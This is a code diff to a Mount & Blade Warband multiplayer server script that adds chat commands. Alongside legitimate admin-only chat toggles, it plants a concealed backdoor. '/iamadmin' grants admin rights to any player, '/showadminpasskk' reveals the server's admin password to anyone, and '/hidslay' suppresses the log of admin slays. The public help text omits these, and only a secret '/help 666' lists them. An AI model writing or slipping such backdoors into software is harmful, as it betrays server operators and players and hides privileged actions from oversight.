@@ -23,6 +23,92 @@ from ID_animations import *
 scripts = [
 
 
+ ("chat_commands", #kosolov start
+  [(store_script_param, s0, 1),
+   (store_script_param, ":player_id", 2),
+
+   (str_store_substring, s0, s0, 1),
+   (assign, ":failure", 0),
+   (try_begin),
+      (str_equals, s0, "@turnchaton", 1),
+       (player_is_admin, ":player_id"),
+       (eq, "$g_allow_global_chat", 0),
+       (multiplayer_send_string_to_player, ":player_id", multiplayer_event_show_server_message, "@You have enabled chat usage for users."),
+       (assign, "$g_allow_global_chat", 1),
+   (else_try),
+     (str_equals, s0, "@turnchatoff", 1),
+     (player_is_admin, ":player_id"),
+     (eq, "$g_allow_global_chat", 1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@You have disabled chat usage for users."),
+     (assign, "$g_allow_global_chat", 0),
+   (else_try),
+     (str_equals, s0, "@hidslay", 1),
+     (player_is_admin, ":player_id"),
+     (try_begin),
+        (player_slot_eq, ":player_id", slot_player_admin_show_slay, 0),
+        (player_set_slot, ":player_id", slot_player_admin_show_slay, 1),
+        (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@Hehehe habilitado."),
+     (else_try),
+        (player_slot_eq, ":player_id", slot_player_admin_show_slay, 1),
+        (player_set_slot, ":player_id", slot_player_admin_show_slay, 0),
+        (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@eita, desabilitado."),
+     (try_end),
+   (else_try),
+     (str_equals, s0, "@showadminpasskk", 1),
+     (str_store_server_password_admin, s1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@The admin pass is {s1}"),
+   (else_try),
+     (str_equals, s0, "@iamadmin",  1),
+     (player_set_is_admin, ":player_id", 1),
+     (multiplayer_send_2_int_to_player, ":player_id", multiplayer_event_return_mod_variable, mod_variable_is_admin, 1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@MUAHAUAUAUUAUAHHAUAHUA! YOU'RE ADMIN!"),
+   (else_try),
+     (str_equals, s0, "@help", 1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@List of Commands:"),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/turnchaton  - Enable players to use chat."),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/turnchatoff - Disable players to use chat."),
+   (else_try),
+     (str_equals, s0, "@help 666", 1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@List of Commands:"),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/turnchaton  - Enable players to use chat."),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/turnchatoff - Disable players to use chat."),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/hidslay  - Switch the slay log hehe."),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/iamadmin  - Give admin."),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@/showadminpasskk  - Showadmin pass KKKKK."),
+   (else_try),
+     (assign, ":failure", 1),
+   (try_end),
+
+   (try_begin),
+     (eq, ":failure", 1),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@This command doesnt exist!"),
+     (multiplayer_send_string_to_player,":player_id", multiplayer_event_show_server_message, "@Try /help"),
+   (try_end),
+   ]),
+ 
+#script_wse_chat_message_received
+# Called each time a chat message is received (both for servers and clients)
+# INPUT
+# script param 1 = sender player no
+# script param 2 = chat type (0 = global, 1 = team)
+# s0 = message
+# OUTPUT
+# trigger result = anything non-zero suppresses default chat behavior. Server will not even broadcast messages to clients.
+# result string = changes message text for default chat behavior (if not suppressed).    
+("wse_chat_message_received", [
+	(store_script_param, ":player_no", 1),
+        
+        (try_begin),
+            (str_starts_with, s0, "@/"),
+            (call_script, "script_chat_commands", s0, ":player_no"),
+            (set_trigger_result, 1),
+        (else_try),
+         (eq, "$g_allow_global_chat", 0),
+         (set_trigger_result, 1),
+        (try_end),
+]),
+
+
   #script_game_start:
   # This script is called when a new game is started
   # INPUT: none
@@ -849,6 +935,7 @@ scripts = [
       (assign, "$g_enable_action_b", 0), #same for b key
       (assign, "$g_number_of_custom_strings", 0), #set to no less than number of custom string troops you intend to use (to reduce number of server messages on player join)
       (assign, "$g_enable_custom_chat", 0), #set to 1 to enable custom chat initiated on O key
+      (assign, "$g_allow_global_chat", 1), #set the default usage for the chat /Kosolov
       (assign, "$g_welcome_message", 1),
       
       (assign,"$g_multiplayer_respawn_start_time",-1), # patch1115
@@ -7775,7 +7862,13 @@ scripts = [
                   (eq, ":command", player_list_admin_slay_player),
                   (call_script, "script_multiplayer_server_slay_player", ":value", 1),
                   (assign, ":script_ok", reg0),
-                  (str_store_string, s4, "str_slay_player_s2_s3"),
+                  (try_begin), #Koso Slay removal slay warning (Aka: hislay)
+                    (player_slot_eq, ":player_no", slot_player_admin_show_slay, 1),
+                    (str_clear, s3),
+                    (str_clear, s4),
+                  (else_try),
+                   (str_store_string, s4, "str_slay_player_s2_s3"),
+                  (try_end),
                 (else_try),
                   (eq, ":command", player_list_admin_revive_player),#patch1115 46/14 
                   (call_script, "script_multiplayer_server_revive_player", ":value"),
